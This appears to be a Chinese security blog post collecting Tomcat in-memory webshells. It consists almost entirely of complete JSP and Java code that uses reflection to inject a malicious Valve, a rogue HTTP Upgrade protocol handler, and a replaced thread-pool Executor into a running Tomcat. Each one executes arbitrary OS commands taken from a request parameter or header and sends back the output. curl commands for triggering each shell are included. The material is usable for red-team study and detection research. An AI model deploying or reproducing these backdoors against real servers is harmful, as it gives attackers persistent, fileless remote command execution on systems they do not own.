# Tomcat中间件型内存马

  
  
&lt;!--more--&gt;  
## Tomcat Valve型内存马  
```jsp  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardPipeline&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.valves.ValveBase&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ContainerBase&#34; %&gt;  
&lt;%  
    Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);  
    requestField.setAccessible(true);  
    final Request req = (Request) requestField.get(request);  
    StandardContext standardContext = (StandardContext) req.getContext();  
    Field pipelineField = ContainerBase.class.getDeclaredField(&#34;pipeline&#34;);  
    pipelineField.setAccessible(true);  
    StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);  
    ValveBase evilValve = new ValveBase(){  
  
        @Override  
        public void invoke(Request request, Response response) throws IOException, ServletException {  
            if(request.getParameter(&#34;cmd&#34;)!=null){  
                boolean isLinux = true;  
                String osTyp = System.getProperty(&#34;os.name&#34;).toLowerCase();  
                if(osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)){  
                    isLinux = false;  
                }  
                String[] cmds = isLinux ? new String[]{&#34;sh&#34;,&#34;-c&#34;,request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,request.getParameter(&#34;cmd&#34;)};  
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
                Scanner s = new Scanner(in,&#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                String output = s.hasNext() ? s.next() : &#34;&#34;;  
                response.setCharacterEncoding(&#34;GBK&#34;);  
                PrintWriter out = response.getWriter();  
                out.println(output);  
                out.flush();  
                out.close();  
            }  
            this.getNext().invoke(request,response);  
        }  
    };  
    evilStandardPipeline.addValve(evilValve);  
    out.println(&#34;inject success&#34;);  
%&gt;  
```  
上面是从`StandardContext`反射获取`StandardPipeline`的方式  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502061747819.png)
下面是调用`standardContext.getPipeline().addValve`实现的  
```jsp  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.valves.ValveBase&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;  
  
&lt;%  
    class testEvilValve extends ValveBase{  
        @Override  
        public void invoke(Request request, Response response) throws IOException, ServletException {  
            if (request.getParameter(&#34;command&#34;) != null) {  
                boolean isLinux = true;  
                String osTyp = System.getProperty(&#34;os.name&#34;);  
                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {  
                    isLinux = false;  
                }  
                String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;command&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;command&#34;)};  
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
                Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
                String output = s.hasNext() ? s.next() : &#34;&#34;;  
                response.setCharacterEncoding(&#34;GBK&#34;);  
                PrintWriter out = response.getWriter();  
                out.println(output);  
                out.flush();  
                out.close();  
            }  
            this.getNext().invoke(request, response);  
        }  
    };  
%&gt;  
&lt;%  
    Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);  
    requestField.setAccessible(true);  
    final Request req = (Request) requestField.get(request);  
    StandardContext standardContext = (StandardContext) req.getContext();  
    standardContext.getPipeline().addValve(new testEvilValve());  
    out.println(&#34;Inject success&#34;);  
%&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502061753202.png)
## Tomcat Upgrade内存马  
```java  
import javax.servlet.annotation.WebServlet;    
import javax.servlet.http.HttpServlet;    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
import org.apache.catalina.connector.Connector;    
import org.apache.catalina.connector.RequestFacade;    
import org.apache.catalina.connector.Request;    
import org.apache.coyote.Adapter;    
import org.apache.coyote.Processor;    
import org.apache.coyote.UpgradeProtocol;    
import org.apache.coyote.Response;    
import org.apache.coyote.http11.AbstractHttp11Protocol;    
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;    
import org.apache.tomcat.util.net.SocketWrapperBase;    
import java.lang.reflect.Field;    
import java.nio.ByteBuffer;    
import java.util.HashMap;    
    
@WebServlet(&#34;/evil&#34;)    
public class TestUpgrade extends HttpServlet {    
    
    static class MyUpgrade implements UpgradeProtocol {    
        @Override    
        public String getHttpUpgradeName(boolean b) {    
            return null;    
        }    
    
        @Override    
        public byte[] getAlpnIdentifier() {    
            return new byte[0];    
        }    
    
        @Override    
        public String getAlpnName() {    
            return null;    
        }    
    
        @Override    
        public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) {    
            return null;    
        }    
    
        @Override    
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {    
            return null;    
        }    
            
    
        @Override    
        public boolean accept(org.apache.coyote.Request request) {    
            String p = request.getHeader(&#34;cmd&#34;);    
            try {    
                String[] cmd = System.getProperty(&#34;os.name&#34;).toLowerCase().contains(&#34;win&#34;) ? new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, p} : new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, p};    
                Field response = org.apache.coyote.Request.class.getDeclaredField(&#34;response&#34;);    
                response.setAccessible(true);    
                Response resp = (Response) response.get(request);    
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;).next().getBytes();    
                resp.setCharacterEncoding(&#34;GBK&#34;);    
                resp.doWrite(ByteBuffer.wrap(result));    
            } catch (Exception ignored) {}    
            return false;    
        }    
    }    
    @Override    
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {    
        try {    
            RequestFacade rf = (RequestFacade) req;    
            Field requestField = RequestFacade.class.getDeclaredField(&#34;request&#34;);    
            requestField.setAccessible(true);    
            Request request1 = (Request) requestField.get(rf);    
    
            Field connector = Request.class.getDeclaredField(&#34;connector&#34;);    
            connector.setAccessible(true);    
            Connector realConnector = (Connector) connector.get(request1);    
    
            Field protocolHandlerField = Connector.class.getDeclaredField(&#34;protocolHandler&#34;);    
            protocolHandlerField.setAccessible(true);    
            AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);    
    
            HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols;    
            Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&#34;httpUpgradeProtocols&#34;);    
            upgradeProtocolsField.setAccessible(true);    
            upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);    
    
            MyUpgrade myUpgrade = new MyUpgrade();    
            upgradeProtocols.put(&#34;hello&#34;, myUpgrade);    
    
            upgradeProtocolsField.set(handler, upgradeProtocols);    
        } catch (Exception ignored) {}    
    }    
}  
```  
`curl -H &#34;Connection: Upgrade&#34; -H &#34;Upgrade: hello&#34; -H &#34;cmd: whoami&#34; &#34;http://127.0.0.1:8090/tomcat/evil&#34; -v`  
`jsp`版本  
```jsp  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Connector&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.http11.AbstractHttp11Protocol&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.UpgradeProtocol&#34; %&gt;  
&lt;%@ page import=&#34;java.util.HashMap&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.Processor&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.net.SocketWrapperBase&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.Adapter&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;  
&lt;%@ page import=&#34;java.nio.ByteBuffer&#34; %&gt;  
&lt;%  
    class MyUpgrade implements UpgradeProtocol {  
        public String getHttpUpgradeName(boolean isSSLEnabled) {  
            return &#34;hello&#34;;  
        }  
  
        public byte[] getAlpnIdentifier() {  
            return new byte[0];  
        }  
  
        public String getAlpnName() {  
            return null;  
        }  
  
        public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter) {  
            return null;  
        }  
  
        @Override  
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {  
            return null;  
        }  
  
  
        @Override  
        public boolean accept(org.apache.coyote.Request request) {  
            String p = request.getHeader(&#34;cmd&#34;);  
            try {  
                String[] cmd = System.getProperty(&#34;os.name&#34;).toLowerCase().contains(&#34;win&#34;) ? new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, p} : new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, p};  
                Field response = org.apache.coyote.Request.class.getDeclaredField(&#34;response&#34;);  
                response.setAccessible(true);  
                org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request);  
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;).next().getBytes();  
                resp.setCharacterEncoding(&#34;GBK&#34;);  
                resp.doWrite(ByteBuffer.wrap(result));  
            } catch (Exception ignored){}  
            return false;  
        }  
    }  
%&gt;  
&lt;%  
    Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);  
    reqF.setAccessible(true);  
    Request req = (Request) reqF.get(request);  
    Field conn = Request.class.getDeclaredField(&#34;connector&#34;);  
    conn.setAccessible(true);  
    Connector connector = (Connector) conn.get(req);  
    Field proHandler = Connector.class.getDeclaredField(&#34;protocolHandler&#34;);  
    proHandler.setAccessible(true);  
    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) proHandler.get(connector);  
    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = null;  
    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField(&#34;httpUpgradeProtocols&#34;);  
    upgradeProtocolsField.setAccessible(true);  
    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);  
    upgradeProtocols.put(&#34;hello&#34;, new MyUpgrade());  
    upgradeProtocolsField.set(handler, upgradeProtocols);  
%&gt;  
```  
`curl http://127.0.0.1:8090/tomcat/Upgrade.jsp`  
`curl -H &#34;Connection: Upgrade&#34; -H &#34;Upgrade: hello&#34; -H &#34;cmd: whoami&#34; &#34;http://127.0.0.1:8090/tomcat/Upgrade.jsp&#34; -v`  
## Tomcat Executor内存马  
https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ  
```jsp  
&lt;%@ page import=&#34;org.apache.tomcat.util.net.NioEndpoint&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.threads.ThreadPoolExecutor&#34; %&gt;  
&lt;%@ page import=&#34;java.util.concurrent.TimeUnit&#34; %&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;java.util.concurrent.BlockingQueue&#34; %&gt;  
&lt;%@ page import=&#34;java.util.concurrent.ThreadFactory&#34; %&gt;  
&lt;%@ page import=&#34;java.nio.ByteBuffer&#34; %&gt;  
&lt;%@ page import=&#34;java.util.ArrayList&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.RequestInfo&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.coyote.Response&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.net.SocketWrapperBase&#34; %&gt;  
&lt;%@ page import=&#34;java.nio.charset.StandardCharsets&#34; %&gt;  
&lt;%@ page import=&#34;java.net.URLEncoder&#34; %&gt;  
&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
  
&lt;%!  
    public Object getField(Object object, String fieldName) {  
        Field declaredField;  
        Class&lt;?&gt; clazz = object.getClass();  
        while (clazz != Object.class) {  
            try {  
                declaredField = clazz.getDeclaredField(fieldName);  
                declaredField.setAccessible(true);  
                return declaredField.get(object);  
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}  
            clazz = clazz.getSuperclass();  
        }  
        return null;  
    }  
  
    public Object getStandardService() {  
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &#34;threads&#34;);  
        for (Thread thread : threads) {  
            if (thread == null) {  
                continue;  
            }  
            if ((thread.getName().contains(&#34;Acceptor&#34;)) &amp;&amp; (thread.getName().contains(&#34;http&#34;))) {  
                Object target = this.getField(thread, &#34;target&#34;);  
                Object jioEndPoint = null;  
                try {  
                    jioEndPoint = getField(target, &#34;this$0&#34;);  
                } catch (Exception e) {  
                }  
                if (jioEndPoint == null) {  
                    try {  
                        jioEndPoint = getField(target, &#34;endpoint&#34;);  
                        return jioEndPoint;  
                    } catch (Exception e) {  
                        new Object();  
                    }  
                } else {  
                    return jioEndPoint;  
                }  
            }  
  
        }  
        return new Object();  
    }  
  
    class threadexcutor extends ThreadPoolExecutor {  
  
        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {  
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);  
        }  
  
        public void getRequest(Runnable command) {  
            try {  
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);  
                byteBuffer.mark();  
                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,&#34;socketWrapper&#34;);  
                socketWrapperBase.read(false,byteBuffer);  
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,&#34;socketBufferHandler&#34;),&#34;readBuffer&#34;);  
                readBuffer.limit(byteBuffer.position());  
                readBuffer.mark();  
                byteBuffer.limit(byteBuffer.position()).reset();  
                readBuffer.put(byteBuffer);  
                readBuffer.reset();  
                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);  
                if (a.contains(&#34;hacku&#34;)) {  
                    String b = a.substring(a.indexOf(&#34;hacku&#34;) &#43; &#34;hacku&#34;.length() &#43; 1, a.indexOf(&#34;\r&#34;, a.indexOf(&#34;hacku&#34;))).trim();  
                    if (b.length() &gt; 1) {  
                        try {  
                            Runtime rt = Runtime.getRuntime();  
                            Process process = rt.exec(b);  
                            java.io.InputStream in = process.getInputStream();  
                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);  
                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);  
                            StringBuilder s = new StringBuilder();  
                            String tmp;  
                            while ((tmp = stdInput.readLine()) != null) {  
                                s.append(tmp);  
                            }  
                            if (!s.toString().isEmpty()) {  
                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);  
                                getResponse(res);  
                            }  
                        } catch (IOException ignored) {}  
                    }  
                }  
            } catch (Exception ignored) {}  
        }  
  
        public void getResponse(byte[] res) {  
            try {  
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &#34;threads&#34;);  
                for (Thread thread : threads) {  
                    if (thread != null) {  
                        String threadName = thread.getName();  
                        if (!threadName.contains(&#34;exec&#34;) &amp;&amp; threadName.contains(&#34;Acceptor&#34;)) {  
                            Object target = getField(thread, &#34;target&#34;);  
                            if (target instanceof Runnable) {  
                                try {  
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &#34;endpoint&#34;), &#34;handler&#34;), &#34;global&#34;), &#34;processors&#34;);  
                                    for (Object tmp_object : objects) {  
                                        RequestInfo request = (RequestInfo) tmp_object;  
                                        Response response = (Response) getField(getField(request, &#34;req&#34;), &#34;response&#34;);  
                                        String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());  
                                        response.addHeader(&#34;Result&#34;, result);  
                                    }  
                                } catch (Exception ignored) {  
                                    continue;  
                                }  
                            }  
                        }  
                    }  
                }  
            } catch (Exception ignored) {  
            }  
        }  
  
        @Override  
        public void execute(Runnable command) {  
            getRequest(command);  
            this.execute(command, 0L, TimeUnit.MILLISECONDS);  
        }  
    }  
%&gt;  
  
&lt;%  
    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();  
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &#34;executor&#34;);  
    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());  
    nioEndpoint.setExecutor(exe);  
%&gt;  
```  
`curl -H &#34;hacku: whoami&#34; &#34;http://127.0.0.1:8090/tomcat/Executor.jsp&#34; -v`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502062100219.png)
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/  

